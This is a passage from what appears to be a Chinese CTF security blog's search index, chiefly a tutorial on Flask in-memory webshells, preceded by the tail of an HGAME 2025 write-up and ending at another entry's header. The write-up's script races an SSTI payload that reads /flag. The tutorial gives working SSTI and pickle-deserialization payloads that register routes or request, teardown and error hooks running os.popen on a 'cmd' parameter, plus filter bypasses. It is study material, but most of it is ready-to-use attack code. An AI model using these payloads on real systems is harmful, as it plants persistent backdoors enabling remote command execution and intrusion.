class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://node1.hgame.vidar.club:31112/app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race_write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        requests.post(target + <span class="string">&#x27;/send&#x27;</span>,</span><br><span class="line">                      data=&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(target + <span class="string">&#x27;/read&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hgame&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 启动竞争写入线程</span></span><br><span class="line">    threading.Thread(target=race_write, daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动检测线程</span></span><br><span class="line">    threading.Thread(target=exploit, daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/HGAME2025-week1/"><img src="/2025/02/23/HGAME2025-week1/QQ20250223-132808.png" alt="QQ20250223-132808"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> hgame </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python flask内存马学习</title>
      <link href="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>内存马</strong>，也被称为<strong>无文件马</strong>，是无文件攻击的一种常用手段。</p><p>常用的python框架有<code>Django</code>、<code>flask</code>，而这两种框架都可能存在SSTI漏洞<strong>。<code>python 内存马</code><strong>就是利用flask框架中</strong>SSTI</strong>或者<strong>pickle反序列化</strong>来实现的，通过添加新的路由访问该路由实现命令执行。</p><h1 id="请求上下文管理机制"><a href="#请求上下文管理机制" class="headerlink" title="请求上下文管理机制"></a>请求上下文管理机制</h1><p>当网页请求进入flask时，会实例化一个<code>requset context</code>.在python中分出了两种上下文：<strong>请求上下文(request context)、应用上下文(session context).<strong>一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个stack的栈结构，也就是说它拥有一个栈所拥有的全部特性</strong>。<code>request context</code>实例化后会被push到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</strong> </p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>利用flask编写一个SSTI例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hello, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>原始flask内存马payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>下面我们将Payload拆开来, 逐层分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>前面的<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>中，<code>url_for</code>是flask的一个方法，可以调用<code>__globals__</code>属性，**<code>__globals__</code>能返回函数所在模块命名空间的所有变量<strong>，其中包括很多已经引用的模块，而这里是有<code>__builtins__</code>的，而</strong><code>__builtins__</code>中包含很多内建函数**，其中包括命令执行函数<code>eval()</code>。即这一步主要是为了获取命令执行函数<code>eval()</code>，当然采用SSTI其他payload获取该函数也是可以的</p><p>而后面的<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>用于动态注册一个新的路由规则。</p><p>在flask中我们通常使用**<code>@app.route()</code><strong>装饰器来添加路由，而其也是调用了<code>add_url_rule</code>函数来添加路由的。</strong><code>app.add_url_rule</code>** 提供了更为底层和灵活的方式来定义路由，尤其适合在动态或程序化场景下使用。</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.png"></p><blockquote><ul><li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li><li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li><li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li><li>provide_automatic_options: 控制是否应自动添加选项方法.</li><li>options: 要转发到基础规则对象的选项.</li></ul></blockquote><p>而这里<code>&#39;/shell&#39;</code>指路由的路径。<code>shell</code>是路由规则的名称，它是这个路由的标识符，可以在其他地方引用。**<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code><strong>则是该路由对应的函数，这里定义的一个匿名函数<code>lambda</code>，用于执行命令，</strong>通过<code>_request_ctx_stack.top</code>指向请求上下文栈的顶部元素，即当前正在处理的请求，再通过<code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>获取请求中cmd参数的值，默认为<code>whoami</code>，通过<code>read()</code>标准输出，从而达到添加路由做到任意命令执行**</p><p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>。 <strong><code>_request_ctx_stack</code><strong>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>。</strong><code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</strong>这里指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到。</p><blockquote><p>这里app的获取也可以通过**<code>sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code>**</p></blockquote><h1 id="add-url-rule的局限"><a href="#add-url-rule的局限" class="headerlink" title="add_url_rule的局限"></a>add_url_rule的局限</h1><p>上面的payload只针对旧版，但由于新版关闭debug模式会调用check函数，即<code>_check_setup_finished()</code>函数引起报错</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>意思就是这个app已经跑起来了,这个函数就不能再被调用了.调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次,所以基本上是完全不能用了.</p><p>所以旧版不能用的大致原因是因为在可以动态添加路由和错误处理逻辑(如<code>register_error_handler()</code>方法)都被**<code>@setupmethod</code>装饰器修饰<strong>了,而<code>@setupmethod</code>装饰器会在Flask跑起来之前就把这些方法都加到一个被check的名单里,以后</strong>再被调用的话就会被<code>@setupmethod</code>这个装饰器给check然后报错**</p><p>所以add_url_rule就不能用了，这里就需要其他方法挂内存🐎</p><h1 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h1><p><strong>python装饰器：装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数,并返回一个新的函数或类.这个新的函数或类通常会保留原始函数或类的功能,但会在其基础上添加一些额外的逻辑.</strong></p><p>在flask中，**<code>before_request</code>是一个装饰器，它用于在请求处理之前执行特定的函数**。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p><p>举个例子：<br><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/3.png"></p><p>这里验证请求头是否包含<code>Authorization</code>字段，如果没有，则返回未授权的错误响应(401)</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/4.png"></p><p>可以看到<code>before_request</code>实际上调用的是**<code>self.before_request_funcs.setdefault(None, []).append(f)</code>**，其意思是：</p><ul><li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li><li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li><li><strong>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</strong></li></ul><p>这个函数f就是我们要添加的函数。</p><p>而该函数就添加之前payload的lambda匿名函数即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>,[]).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><h1 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h1><p><code>after_request</code>与<code>before_request</code>类似。<code>after_request</code>方法允许我们在每个请求之后执行一些操作。我们可以利用该方法来添加一些响应头、记录请求日志等任务</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/5.png"></p><p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global r;r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><p>逐行解释这段代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global r;     #定义一个全局变量,方便获取</span></span><br><span class="line"><span class="string">        r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"><span class="comment">#这里的cmd参数名和r变量名都是可以改的</span></span><br></pre></td></tr></table></figure><p>不带出回显，适用于过滤严格的场景：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)))</span><br></pre></td></tr></table></figure><h1 id="Flask中的其他钩子函数"><a href="#Flask中的其他钩子函数" class="headerlink" title="Flask中的其他钩子函数"></a>Flask中的其他钩子函数</h1><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数.钩子函数是指在执行函数和目标函数之间挂载的函数,框架开发者给调用方提供一个point-挂载点,至于挂载什么函数由调用方决定.</p><p><strong>@before_first_request</strong></p><p>在对应用程序实例的第一个请求之前注册要运行的函数,只会运行一次.</p><p><strong>@before_request</strong></p><p>在每个请求之前注册一个要运行的函数,每一次请求都会执行一次.</p><p><strong>@after_request</strong></p><p>在每个请求之后注册一个要运行的函数,每次请求完成后都会执行.需要接收一个 Response 对象作为参数,并返回一个新的 Response 对象,或者返回接收的 Response 对象.</p><p><strong>@teardown_request</strong></p><p>注册在每一个请求的末尾,不管是否有异常,每次请求的最后都会执行.</p><p><strong>@context_processor</strong></p><p>上下文处理器,返回的字典可以在全部的模板中使用.</p><p><strong>@template_filter(‘upper’)</strong></p><p>增加模板过滤器,可以在模板中使用该函数,后面的参数是名称,在模板中用到.</p><p><strong>@errorhandler(400)</strong></p><p>发生一些异常时,比如404,500,或者抛出异常(Exception)之类的,就会自动调用该钩子函数.</p><p>1.发生请求错误时,框架会自动调用相应的钩子函数,并向钩子函数中传入error参数.</p><p>2.如果钩子函数没有定义error参数,就会报错.</p><p>3.可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常,如果要是发生参数错误,可以abort(404)之类的.</p><p><strong>@teardown_appcontext</strong></p><p>不管是否有异常,注册的函数都会在每次请求之后执行.flask 为上下文提供了一个<code>teardown_appcontext</code>钩子,使用它注册的毁掉函数会在程序上下文被销毁时调用,通常也在请求上下文被销毁时调用.某些情况下这个函数和**@teardown_request**的行为是类似的,一个是请求上下文被销毁时被调用,另一个是应用上下文被销毁时调用.</p><p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数,当请求被正常处理时这个参数将是None,这个函数的返回值将被忽略.</p><h2 id="before-request-after-request和-teardown-request-teardown-appcontext的区别"><a href="#before-request-after-request和-teardown-request-teardown-appcontext的区别" class="headerlink" title="@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别"></a>@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别</h2><p><strong>@after_request</strong>是在视图函数处理完请求并生成响应对象之后，但在响应被发送给客户端之前。而且这个函数需要接收当前的响应作为参数,并可以返回一个新的响应对象或者返回原来的响应对象.</p><p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>无论请求是否成功完成，无论是否发生了异常,是在响应已经被发送给客户端之后被触发,而且不接受任何参数.</p><p><strong>@after_request</strong>装饰的函数如果抛出了异常就会直接跳转到错误处理机制.</p><p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>装饰的函数被抛出的异常通常会被忽略.</p><h2 id="teardown-request的利用"><a href="#teardown-request的利用" class="headerlink" title="@teardown_request的利用"></a>@teardown_request的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>**不能调用<code>request.args.get()</code>动态执行传入的命令,**但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.在这个时候上一个HTTP请求帧已经被销毁了,但是可以执行静态命令.</p><h2 id="teardown-appcontext的利用"><a href="#teardown-appcontext的利用" class="headerlink" title="@teardown_appcontext的利用"></a>@teardown_appcontext的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_appcontext_funcs.append(<span class="keyword">lambda</span> x :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>同样<strong>不能调用<code>request.args.get()</code>动态执行传入的命令</strong>,但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.不然会报错</p><h2 id="errorhandler-的利用"><a href="#errorhandler-的利用" class="headerlink" title="@errorhandler()的利用"></a>@errorhandler()的利用</h2><p>该装饰器内部定义了一个用于注册错误处理函数的函数</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/6.png"></p><p>跟到这个<code>register_error_handler()</code>里边</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/7.png"></p><p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数,就是错误处理函数.</p><p>如果我们能控制<code>code</code>和<code>exc_class</code>,我们就可以利用错误处理的逻辑执行我们传入的函数.那么<code>code</code>和<code>exc_class</code>是从哪里来的呢,看656行的<code>self._get_exc_class_and_code</code>,进入这个方法可以发现他返回的是一个元组,元组里有一个错误的类和一个整数</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/8.png"></p><p>这里直接调用<code>_get_exc_class_and_code()</code>这个方法然后把他的返回值扔到<code>self.error_hander_spec</code>这个字典里.然后给他赋值我们构造的函数.<code>_get_exc_class_and_code()</code>的形参是一个整数就比较方便调用了.</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个方法是可以直接带出回显的</p><h1 id="pickle利用下的payload"><a href="#pickle利用下的payload" class="headerlink" title="pickle利用下的payload"></a>pickle利用下的payload</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>这里参考SSTI的绕过</p><ul><li><strong><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code></strong></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://xz.aliyun.com/news/10381">新版FLASK下python内存马的研究</a></li><li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">Python 内存马分析</a></li><li><a href="https://xz.aliyun.com/news/13976">新版Flask框架下用钩子函数实现内存马的方式</a></li><li><a href="https://chensonghi.github.io/2024/07/20/Memory-Horse-in-Flask/">flask下的内存马</a></li><li><a href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E5%86%85%E5%AD%98%E9%A9%AC/index.html">一些python RCE利用&amp;&amp;内存马</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中的IP伪造</title>
      <link href="/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/</url>
      
